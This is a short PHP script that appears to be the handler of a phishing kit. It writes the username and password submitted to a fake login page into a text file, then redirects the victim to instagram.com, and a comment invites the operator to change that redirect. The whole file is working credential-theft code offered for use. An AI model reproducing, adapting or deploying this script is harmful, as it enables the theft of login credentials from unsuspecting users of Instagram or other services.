<?php

file_put_contents("usernames.txt", "[EMAIL]:  " . $_POST['username'] . "   [PASS]:  " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com'); # This is where your site will redirect to, you may change it(default: instagram.com) #
exit();

?>